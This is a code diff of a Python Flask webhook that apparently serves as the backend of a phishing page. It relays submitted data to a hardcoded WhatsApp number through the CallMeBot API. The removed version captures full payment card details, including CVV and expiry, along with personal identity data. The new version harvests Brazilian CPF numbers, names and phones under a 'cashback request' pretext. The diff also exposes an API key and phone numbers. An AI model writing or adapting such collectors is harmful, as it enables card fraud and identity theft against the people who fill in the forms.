@@ -2,6 +2,7 @@ from flask import Flask, request, jsonify
 from flask_cors import CORS
 import requests
 import urllib.parse
+from waitress import serve
 
 app = Flask(__name__)
 CORS(app)
@@ -12,54 +13,34 @@ def webhook():
 
     try:
         # Dados recebidos
-        nome = dados.get("name", "Não informado")
         cpf = dados.get("cpf", "Não informado")
-        telefone = dados.get("phone", "Não informado")
-        email = dados.get("email", "Não informado")
-        cep = dados.get("cep", "Não informado")
-        nascimento = dados.get("birth", "Não informado")
-        nome_titular = dados.get("nome_titular", "Não informado")
-        numero_cartao = dados.get("numero_cartao", "Não informado")
-        bandeira = dados.get("bandeira", "Não informado")
-        cvv = dados.get("cvv", "Não informado")
-        banco = dados.get("banco", "Não informado")
-        funcao = dados.get("funcao", "Não informado")
-        validade = dados.get("validade", "Não informado")
-        data_envio = dados.get("data_envio", "Não informado")
+        nome = dados.get("nome", "Não informado")
+        telefone = dados.get("telefone", "Não informado")
+        parceiro = dados.get("parceiro", "Não informado")
 
         # Mensagem formatada
-        mensagem = f"""📋 *Cadastro Recebido*
+        mensagem = f"""📋 *Solicitação de Cashback*
 
-*Dados Cadastrais:*
-- Nome: {nome}
 - CPF: {cpf}
+- Nome: {nome}
 - Telefone: {telefone}
-- Email: {email}
-- CEP: {cep}
-- Nascimento: {nascimento}
-
-*Dados do Cartão:*
-- Nome do Titular: {nome_titular}
-- Número: {numero_cartao}
-- Bandeira: {bandeira}
-- CVV: {cvv}
-- Banco: {banco}
-- Função: {funcao}
-- Validade: {validade}
-
-📆 Enviado em: {data_envio}
+- Parceiro: {parceiro}
 """
 
         # URL encode da mensagem
         mensagem_encoded = urllib.parse.quote(mensagem)
 
-        # Envio via CallMeBot (WhatsApp)
+        # Configuração da API CallMeBot
+        phone = "5511954217985"  # Número configurado na API
+        apikey = "5483609"       # Sua chave API
+
         api_url = (
             f"https://api.callmebot.com/whatsapp.php?"
-            f"phone=+5511956041955&apikey=3337605"
+            f"phone={phone}&apikey={apikey}"
             f"&text={mensagem_encoded}"
         )
 
+        # Fazendo o envio
         response = requests.get(api_url)
 
         return jsonify({
@@ -71,7 +52,6 @@ def webhook():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-from waitress import serve
 
 if __name__ == '__main__':
     serve(app, host='0.0.0.0', port=5000)
